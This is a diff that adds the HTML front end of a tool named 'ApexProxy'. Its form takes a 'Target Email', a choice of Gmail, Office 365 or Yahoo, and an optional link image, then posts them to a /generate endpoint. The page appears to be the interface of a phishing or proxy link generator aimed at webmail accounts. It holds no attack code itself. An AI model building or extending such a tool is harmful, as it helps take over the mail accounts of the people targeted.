@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ApexProxy 🦎</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body class="bg-gray-900 text-white font-orbitron">
+    <div class="min-h-screen flex items-center juntasify-center p-4">
+        <div x-data="{ service: 'gmail', email: '', animating: false }" 
+             class="bg-gray-800 rounded-xl p-8 w-full max-w-md border border-cyan-400 shadow-lg shadow-cyan-400/50">
+            <h1 class="text-3xl text-center mb-6 text-cyan-400 animate-pulse">ApexProxy 🦎</h1>
+            <form @submit.prevent="animating = true; setTimeout(() => $el.submit(), 1000)" 
+                  action="/generate" method="post" enctype="multipart/form-data">
+                <div class="mb-4">
+                    <label class="block text-cyan-300 mb-2">Target Email</label>
+                    <input x-model="email" type="email" name="email" required
+                           class="w-full p-2 bg-gray-700 rounded border border-cyan-400 text-white focus:outline-none focus:ring-2 focus:ring-cyan-400">
+                </div>
+                <div class="mb-4">
+                    <label class="block text-cyan-300 mb-2">Service</label>
+                    <div class="grid grid-cols-3 gap-2">
+                        <button type="button" @click="service = 'gmail'"
+                                :class="service === 'gmail' ? 'bg-cyan-500' : 'bg-gray-700'"
+                                class="p-2 rounded border border-cyan-400 flex items-center justify-center hover:bg-cyan-600 transition">
+                            <img src="/static/gmail.png" alt="Gmail" class="h-8">
+                        </button>
+                        <button type="button" @click="service = 'o365'"
+                                :class="service === 'o365' ? 'bg-cyan-500' : 'bg-gray-700'"
+                                class="p-2 rounded border border-cyan-400 flex items-center justify-center hover:bg-cyan-600 transition">
+                            <img src="/static/o365.png" alt="Office 365" class="h-8">
+                        </button>
+                        <button type="button" @click="service = 'yahoo'"
+                                :class="service === 'yahoo' ? 'bg-cyan-500' : 'bg-gray-700'"
+                                class="p-2 rounded border border-cyan-400 flex items-center justify-center hover:bg-cyan-600 transition">
+                            <img src="/static/yahoo.png" alt="Yahoo" class="h-8">
+                        </button>
+                    </div>
+                    <input type="hidden" name="service" x-model="service">
+                </div>
+                <div class="mb-6">
+                    <label class="block text-cyan-300 mb-2">Link Image (Optional)</label>
+                    <input type="file" name="image" accept="image/*"
+                           class="w-full p-2 bg-gray-700 rounded border border-cyan-400 text-white">
+                </div>
+                <button type="submit" 
+                        :disabled="animating"
+                        class="w-full p-3 bg-cyan-500 rounded text-gray-900 font-bold hover:bg-cyan-400 transition transform hover:scale-105"
+                        x-bind:class="animating ? 'opacity-50 cursor-not-allowed' : ''">
+                    Generate Lizard 🦎
+                </button>
+            </form>
+        </div>
+    </div>
+    <script src="/static/main.js"></script>
+</body>
+</html>
